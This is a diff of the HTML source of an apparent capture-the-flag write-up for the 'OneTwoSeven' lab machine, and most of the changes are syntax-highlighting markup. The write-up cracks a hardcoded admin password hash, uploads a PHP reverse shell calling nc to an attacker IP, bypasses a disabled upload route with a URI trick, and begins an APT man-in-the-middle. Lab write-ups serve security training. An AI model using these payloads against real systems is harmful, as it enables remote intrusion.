+      &lt;script&gt;window.jQuery || document.write('&lt;script src="</span><span class="o">/</span><span class="nx">docs</span><span class="o">/</span><span class="mf">4.3</span><span class="o">/</span><span class="nx">assets</span><span class="o">/</span><span class="nx">js</span><span class="o">/</span><span class="nx">vendor</span><span class="o">/</span><span class="nx">jquery</span><span class="o">-</span><span class="nx">slim</span><span class="o">.</span><span class="nb">min</span><span class="o">.</span><span class="nx">js</span><span class="s2">"&gt;&lt;\/script&gt;')&lt;/script&gt;&lt;script src="</span><span class="nx">dist</span><span class="o">/</span><span class="nx">js</span><span class="o">/</span><span class="nx">bootstrap</span><span class="o">.</span><span class="nx">bundle</span><span class="o">.</span><span class="nb">min</span><span class="o">.</span><span class="nx">js</span><span class="s2">" crossorigin="</span><span class="nx">anonymous</span><span class="s2">"&gt;&lt;/script&gt;&lt;/body&gt;
+&lt;script src="</span><span class="nx">https</span><span class="o">://</span><span class="nx">code</span><span class="o">.</span><span class="nx">jquery</span><span class="o">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.3</span><span class="o">.</span><span class="mf">1.</span><span class="nx">slim</span><span class="o">.</span><span class="nb">min</span><span class="o">.</span><span class="nx">js</span><span class="s2">" integrity="</span><span class="nx">sha384</span><span class="o">-</span><span class="nx">q8i</span><span class="o">/</span><span class="nx">X</span><span class="o">+</span><span class="mi">965</span><span class="nx">DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH</span><span class="o">+</span><span class="mi">8</span><span class="nx">abtTE1Pi6jizo</span><span class="s2">" crossorigin="</span><span class="nx">anonymous</span><span class="s2">"&gt;&lt;/script&gt;
+&lt;/main&gt;
+  &lt;/footer&gt;
+    &lt;p&gt;&amp;copy; 2019 OneTwoSeven, Dec. &amp;middot; &lt;a href="</span><span class="c1">#"&gt;Privacy&lt;/a&gt; &amp;middot; &lt;a href="#"&gt;Terms&lt;/a&gt;&lt;/p&gt;
+</span>    <span class="o">&lt;</span><span class="nx">p</span> <span class="k">class</span><span class="err">="</span><span class="nc">float</span><span class="o">-</span><span class="nx">right</span><span class="s2">"&gt;&lt;a href="</span><span class="c1">#"&gt;Back to top&lt;/a&gt;&lt;/p&gt;
+</span>  <span class="o">&lt;</span><span class="nx">footer</span> <span class="k">class</span><span class="err">="</span><span class="nc">container</span><span class="s2">"&gt;
+  &lt;!-- FOOTER --&gt;
+  &lt;/div&gt;&lt;!-- /.container --&gt;
+    &lt;!-- /END THE FEATURETTES --&gt;
+    &lt;hr class="</span><span class="nx">featurette</span><span class="o">-</span><span class="nx">divider</span><span class="s2">"&gt;
+    &lt;/div&gt;
+	     &lt;/div&gt;
+         &lt;/form&gt;
+            &lt;/table&gt;
+              &lt;tr&gt;&lt;td colspan="</span><span class="mi">2</span><span class="s2">"&gt;&lt;center&gt;&lt;button type="</span><span class="nx">submit</span><span class="s2">" name="</span><span class="nx">login</span><span class="s2">"&gt;Login&lt;/button&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;
+              &lt;tr&gt;&lt;td&gt;&lt;b&gt;Password:&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="</span><span class="nx">password</span><span class="s2">" name="</span><span class="nx">password</span><span class="s2">" size="</span><span class="mi">40</span><span class="s2">" required&gt;&lt;/td&gt;&lt;/tr&gt;
+              &lt;tr&gt;&lt;td&gt;&lt;b&gt;Username:&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="</span><span class="nx">text</span><span class="s2">" name="</span><span class="nx">username</span><span class="s2">" size="</span><span class="mi">40</span><span class="s2">" required autofocus&gt;&lt;/td&gt;&lt;/tr&gt;
+	    &lt;table&gt;
+            &lt;h4 class = "</span><span class="nx">form</span><span class="o">-</span><span class="nx">signin</span><span class="o">-</span><span class="nx">heading</span><span class="s2">"&gt;&lt;font size="</span><span class="o">-</span><span class="mi">1</span><span class="s2">" color="</span><span class="nx">red</span><span class="s2">"&gt;&lt;?php echo </span><span class="nv">$msg</span><span class="s2">; ?&gt;&lt;/font&gt;&lt;/h4&gt;
+         &lt;form action="</span><span class="o">/</span><span class="nx">login</span><span class="o">.</span><span class="nx">php</span><span class="s2">" method="</span><span class="nx">post</span><span class="s2">"&gt;
       
-      <span class="nt">&lt;div</span> <span class="na">class =</span><span class="err"> </span><span class="s">"container"</span><span class="nt">&gt;</span>
+      &lt;div class = "</span><span class="nx">container</span><span class="s2">"&gt;
       
-      <span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- /container --&gt;</span>
+      &lt;/div&gt; &lt;!-- /container --&gt;
          ?&gt;
             }
               }
-                  $msg = 'Wrong username or password.';
+                  </span><span class="nv">$msg</span><span class="s2"> = 'Wrong username or password.';
               } else {
-		  header("Location: /menu.php");
-                  $_SESSION['username'] = 'ots-admin';
-</code></pre></div></div>
+		  header("</span><span class="nx">Location</span><span class="o">:</span> <span class="o">/</span><span class="nx">menu</span><span class="o">.</span><span class="nx">php</span><span class="s2">");
+                  </span><span class="nv">$_SESSION['username']</span><span class="s2"> = 'ots-admin';
+</span></code></pre></div></div>
 <p><br> The credentials are hardcoded, however the password is hashed :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ($_POST['username'] == 'ots-admin' &amp;&amp; hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') { 
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'ots-admin'</span> <span class="o">&amp;&amp;</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="o">==</span> <span class="s1">'11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8'</span><span class="p">)</span> <span class="p">{</span> 
 </code></pre></div></div>
 <p><br> <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">Crackstation</a> was able to crack it :
-<img src="/images/hackthebox/onetwoseven/17.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/17.png" alt=""><br>
 <br> <code class="highlighter-rouge">ots-admin : Homesweethome1</code> :
-<img src="/images/hackthebox/onetwoseven/18.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/onetwoseven/19.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/18.png" alt=""><br>
+<br><img src="/images/hackthebox/onetwoseven/19.png" alt=""><br>
 <br> There’s a plugin upload form and some installed plugins above it, additionally there’s a small button to download the module’s <code class="highlighter-rouge">php</code> source from the directory <code class="highlighter-rouge">/addons</code>:
-<img src="/images/hackthebox/onetwoseven/20.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/20.png" alt=""><br>
 <br> If we can upload plugins then we got <code class="highlighter-rouge">RCE</code>, the form submit button is disabled but we can easily change that :
-<img src="/images/hackthebox/onetwoseven/21.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/onetwoseven/22.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/onetwoseven/23.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/onetwoseven/24.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/21.png" alt=""><br>
+<br><img src="/images/hackthebox/onetwoseven/22.png" alt=""><br>
+<br><img src="/images/hackthebox/onetwoseven/23.png" alt=""><br>
+<br><img src="/images/hackthebox/onetwoseven/24.png" alt=""><br>
 <br> <code class="highlighter-rouge">rev.php</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
-system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f');
-?&gt;
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">system</span><span class="p">(</span><span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1337 &gt;/tmp/f'</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
 </code></pre></div></div>
-<p><img src="/images/hackthebox/onetwoseven/25.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/onetwoseven/26.png" alt="">
+<p><br><img src="/images/hackthebox/onetwoseven/25.png" alt=""><br>
+<br><img src="/images/hackthebox/onetwoseven/26.png" alt=""><br>
 <br> It sent the request to <code class="highlighter-rouge">addon-upload.php</code> and the response was 404.</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /addon-upload.php HTTP/1.1
-Host: 127.0.0.1:60080
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php
-Content-Type: multipart/form-data; boundary=---------------------------171386507112993851681929761040
-Content-Length: 326
-Cookie: PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2
-Connection: close
-Upgrade-Insecure-Requests: 1
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/addon-upload.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:60080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=---------------------------171386507112993851681929761040</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">326</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
 
 
 -----------------------------171386507112993851681929761040
@@ -468,84 +450,84 @@ system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx
 -----------------------------171386507112993851681929761040--
 </code></pre></div></div>
 <p><br>  If we check the <code class="highlighter-rouge">Addon manager</code> plugin we can see some interesting things :
-<img src="/images/hackthebox/onetwoseven/27.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/27.png" alt=""><br>
 <br> First thing is the rewrite rules, any request sent to <code class="highlighter-rouge">addon-upload.php</code> and <code class="highlighter-rouge">addon-download.php</code> gets sent to <code class="highlighter-rouge">addons/ots-man-addon.php</code>. There’s also a small note that says “Disabling a feature through htaccess leads to 404 errors for now.”, This explains why we got 404 when attempting to upload a plugin, however the download feature isn’t disabled and I was able to download the <code class="highlighter-rouge">Addon manager</code> plugin :
-<img src="/images/hackthebox/onetwoseven/28.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/28.png" alt=""><br>
 <br> Since both requests to <code class="highlighter-rouge">addon-upload.php</code> and <code class="highlighter-rouge">addon-download.php</code> go to <code class="highlighter-rouge">ots-man-addon.php</code>, we have to find a way to exploit <code class="highlighter-rouge">ots-man-addon.php</code> and just use <code class="highlighter-rouge">addon-download.php</code> because it’s not disabled. 
 <br> <code class="highlighter-rouge">ots-man-addon.php</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /login.php"); }; if ( strpos($_SERVER['REQUEST_URI'], '/addons/') !== false ) { die(); };
-# OneTwoSeven Admin Plugin
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">session_start</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span> <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /login.php"</span><span class="p">);</span> <span class="p">};</span> <span class="k">if</span> <span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">],</span> <span class="s1">'/addons/'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="p">)</span> <span class="p">{</span> <span class="k">die</span><span class="p">();</span> <span class="p">};</span>
+<span class="c1"># OneTwoSeven Admin Plugin
 # OTS Addon Manager
-switch (true) {
-	# Upload addon to addons folder.
-	case preg_match('/\/addon-upload.php/',$_SERVER['REQUEST_URI']):
-		if(isset($_FILES['addon'])){
-			$errors= array();
-			$file_name = basename($_FILES['addon']['name']);
-			$file_size =$_FILES['addon']['size'];
-			$file_tmp =$_FILES['addon']['tmp_name'];
+</span><span class="k">switch</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+	<span class="c1"># Upload addon to addons folder.
+</span>	<span class="k">case</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\/addon-upload.php/'</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">])</span><span class="o">:</span>
+		<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">])){</span>
+			<span class="nv">$errors</span><span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+			<span class="nv">$file_name</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]);</span>
+			<span class="nv">$file_size</span> <span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">][</span><span class="s1">'size'</span><span class="p">];</span>
+			<span class="nv">$file_tmp</span> <span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">];</span>
 
-			if($file_size &gt; 20000){
-				$errors[]='Module too big for addon manager. Please upload manually.';
-			}
+			<span class="k">if</span><span class="p">(</span><span class="nv">$file_size</span> <span class="o">&gt;</span> <span class="mi">20000</span><span class="p">){</span>
+				<span class="nv">$errors</span><span class="p">[]</span><span class="o">=</span><span class="s1">'Module too big for addon manager. Please upload manually.'</span><span class="p">;</span>
+			<span class="p">}</span>
 
-			if(empty($errors)==true) {
-				move_uploaded_file($file_tmp,$file_name);
-				header("Location: /menu.php");
-				header("Content-Type: text/plain");
-				echo "File uploaded successfull.y";
-			} else {
-				header("Location: /menu.php");
-				header("Content-Type: text/plain");
-				echo "Error uploading the file: ";
-				print_r($errors);
-			}
-		}
-		break;
-	# Download addon from addons folder.
-	case preg_match('/\/addon-download.php/',$_SERVER['REQUEST_URI']):
-		if ($_GET['addon']) {
-			$addon_file = basename($_GET['addon']);
-			if ( file_exists($addon_file) ) {
-				header("Content-Disposition: attachment; filename=$addon_file");
-				header("Content-Type: text/plain");
-				readfile($addon_file);
-			} else {
-				header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
-				die();
-			}
-		}
-		break;
-	default:
-		echo "The addon manager must not be executed directly but only via&lt;br&gt;";
-		echo "the provided RewriteRules:&lt;br&gt;&lt;hr&gt;";
-		echo "RewriteEngine On&lt;br&gt;";
-		echo "RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]&lt;br&gt;";
-		echo "RewriteRule ^addon-download.php addons/ots-man-addon.php [L]&lt;br&gt;&lt;hr&gt;";
-		echo "By commenting individual RewriteRules you can disable single&lt;br&gt;";
-		echo "features (i.e. for security reasons)&lt;br&gt;&lt;br&gt;";
-		echo "&lt;font size='-2'&gt;Please note: Disabling a feature through htaccess leads to 404 errors for now.&lt;/font&gt;";
-		break;
-}
-?&gt;
+			<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$errors</span><span class="p">)</span><span class="o">==</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+				<span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$file_tmp</span><span class="p">,</span><span class="nv">$file_name</span><span class="p">);</span>
+				<span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /menu.php"</span><span class="p">);</span>
+				<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: text/plain"</span><span class="p">);</span>
+				<span class="k">echo</span> <span class="s2">"File uploaded successfull.y"</span><span class="p">;</span>
+			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+				<span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /menu.php"</span><span class="p">);</span>
+				<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: text/plain"</span><span class="p">);</span>
+				<span class="k">echo</span> <span class="s2">"Error uploading the file: "</span><span class="p">;</span>
+				<span class="nb">print_r</span><span class="p">(</span><span class="nv">$errors</span><span class="p">);</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="c1"># Download addon from addons folder.
+</span>	<span class="k">case</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\/addon-download.php/'</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">])</span><span class="o">:</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">])</span> <span class="p">{</span>
+			<span class="nv">$addon_file</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">]);</span>
+			<span class="k">if</span> <span class="p">(</span> <span class="nb">file_exists</span><span class="p">(</span><span class="nv">$addon_file</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+				<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Disposition: attachment; filename=</span><span class="nv">$addon_file</span><span class="s2">"</span><span class="p">);</span>
+				<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: text/plain"</span><span class="p">);</span>
+				<span class="nb">readfile</span><span class="p">(</span><span class="nv">$addon_file</span><span class="p">);</span>
+			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+				<span class="nb">header</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"SERVER_PROTOCOL"</span><span class="p">]</span><span class="o">.</span><span class="s2">" 404 Not Found"</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="mi">404</span><span class="p">);</span>
+				<span class="k">die</span><span class="p">();</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="k">default</span><span class="o">:</span>
+		<span class="k">echo</span> <span class="s2">"The addon manager must not be executed directly but only via&lt;br&gt;"</span><span class="p">;</span>
+		<span class="k">echo</span> <span class="s2">"the provided RewriteRules:&lt;br&gt;&lt;hr&gt;"</span><span class="p">;</span>
+		<span class="k">echo</span> <span class="s2">"RewriteEngine On&lt;br&gt;"</span><span class="p">;</span>
+		<span class="k">echo</span> <span class="s2">"RewriteRule ^addon-upload.php   addons/ots-man-addon.php [L]&lt;br&gt;"</span><span class="p">;</span>
+		<span class="k">echo</span> <span class="s2">"RewriteRule ^addon-download.php addons/ots-man-addon.php [L]&lt;br&gt;&lt;hr&gt;"</span><span class="p">;</span>
+		<span class="k">echo</span> <span class="s2">"By commenting individual RewriteRules you can disable single&lt;br&gt;"</span><span class="p">;</span>
+		<span class="k">echo</span> <span class="s2">"features (i.e. for security reasons)&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span>
+		<span class="k">echo</span> <span class="s2">"&lt;font size='-2'&gt;Please note: Disabling a feature through htaccess leads to 404 errors for now.&lt;/font&gt;"</span><span class="p">;</span>
+		<span class="k">break</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
 </code></pre></div></div>
 <p><br> This part of the code tells us what we need to do :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	case preg_match('/\/addon-upload.php/',$_SERVER['REQUEST_URI']):
-		if(isset($_FILES['addon'])){
-			$errors= array();
-			$file_name = basename($_FILES['addon']['name']);
-			$file_size =$_FILES['addon']['size'];
-			$file_tmp =$_FILES['addon']['tmp_name'];
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="k">case</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\/addon-upload.php/'</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_URI'</span><span class="p">])</span><span class="o">:</span>
+		<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">])){</span>
+			<span class="nv">$errors</span><span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+			<span class="nv">$file_name</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">][</span><span class="s1">'name'</span><span class="p">]);</span>
+			<span class="nv">$file_size</span> <span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">][</span><span class="s1">'size'</span><span class="p">];</span>
+			<span class="nv">$file_tmp</span> <span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'addon'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">];</span>
 
-			if($file_size &gt; 20000){
-				$errors[]='Module too big for addon manager. Please upload manually.';
-			}
+			<span class="k">if</span><span class="p">(</span><span class="nv">$file_size</span> <span class="o">&gt;</span> <span class="mi">20000</span><span class="p">){</span>
+				<span class="nv">$errors</span><span class="p">[]</span><span class="o">=</span><span class="s1">'Module too big for addon manager. Please upload manually.'</span><span class="p">;</span>
+			<span class="p">}</span>
 
-			if(empty($errors)==true) {
-				move_uploaded_file($file_tmp,$file_name);
-				header("Location: /menu.php");
-				header("Content-Type: text/plain");
-				echo "File uploaded successfull.y";
+			<span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$errors</span><span class="p">)</span><span class="o">==</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+				<span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$file_tmp</span><span class="p">,</span><span class="nv">$file_name</span><span class="p">);</span>
+				<span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /menu.php"</span><span class="p">);</span>
+				<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Type: text/plain"</span><span class="p">);</span>
+				<span class="k">echo</span> <span class="s2">"File uploaded successfull.y"</span><span class="p">;</span>
 </code></pre></div></div>
 <p><br> We need to have <code class="highlighter-rouge">/addon-upload.php</code> in the request URI, we can’t request <code class="highlighter-rouge">/addon-upload.php</code> directly because it’s disabled but we can just put a useless <code class="highlighter-rouge">GET</code> parameter with the value <code class="highlighter-rouge">/addon-upload.php</code>,  and it will pass the check.
 <br> It takes the addon name from the <code class="highlighter-rouge">GET</code> parameter <code class="highlighter-rouge">addon</code> so we have to add that parameter to the request URI.
@@ -553,18 +535,18 @@ switch (true) {
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/addon-download.php?addon=addons/rev.php&amp;test=/addon-upload.php
 </code></pre></div></div>
 <p><br> Request :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /addon-download.php?addon=addons/rev.php&amp;test=/addon-upload.php HTTP/1.1
-Host: 127.0.0.1:60080
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php
-Content-Type: multipart/form-data; boundary=---------------------------171386507112993851681929761040
-Content-Length: 326
-Cookie: PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2
-Connection: close
-Upgrade-Insecure-Requests: 1
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/addon-download.php?addon=addons/rev.php&amp;test=/addon-upload.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">127.0.0.1:60080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">multipart/form-data; boundary=---------------------------171386507112993851681929761040</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">326</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=ijo6tb6dnflvsm803pivm8dcd2</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
 
 
 -----------------------------171386507112993851681929761040
@@ -579,25 +561,23 @@ system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx
 -----------------------------171386507112993851681929761040--
 </code></pre></div></div>
 <p><br> Response :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 302 Found
-Date: Thu, 29 Aug 2019 20:56:24 GMT
-Server: Apache/2.4.25 (Debian)
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-Location: /menu.php
-Content-Length: 27
-Connection: close
-Content-Type: text/plain;charset=UTF-8
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 29 Aug 2019 20:56:24 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.25 (Debian)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">/menu.php</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">27</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/plain;charset=UTF-8</span>
 
 
 File uploaded successfull.y
 </code></pre></div></div>
 <p><br> Now if we check <code class="highlighter-rouge">/addons</code>, <code class="highlighter-rouge">rev.php</code> is there :
-<img src="/images/hackthebox/onetwoseven/29.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/onetwoseven/30.png" alt=""></p>
+<br><img src="/images/hackthebox/onetwoseven/29.png" alt=""><br>
+<br><img src="/images/hackthebox/onetwoseven/30.png" alt=""><br></p>
 <hr>
 
 <h2 id="apt-mitm-root-flag">APT MITM, Root Flag</h2>
@@ -636,9 +616,9 @@ www-admin-data@onetwoseven:/$
 </code></pre></div></div>
 <p><br> In <code class="highlighter-rouge">/etc/apt/sources.list.d/onetwoseven.list</code> there’s an entry for <code class="highlighter-rouge">packages.onetwoseven.htb</code>. Let’s use that.
 <br> I started another burp listener on port 8181 :
-<img src="/images/hackthebox/onetwoseven/31.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/31.png" alt=""><br>
 <br> And I added <code class="highlighter-rouge">packages.onetwoseven.htb</code> to my <code class="highlighter-rouge">hosts</code> file and made it point to my ip :
-<img src="/images/hackthebox/onetwoseven/32.png" alt="">
+<br><img src="/images/hackthebox/onetwoseven/32.png" alt=""><br>
 <br> Now any request to <code class="highlighter-rouge">packages.onetwoseven.htb</code> through the proxy server will be sent to my ip. Now we need to create the fake repository and the malicious package.
 <br> I chose <code class="highlighter-rouge">telnet</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-admin-data@onetwoseven:/$ dpkg -l | grep telnet
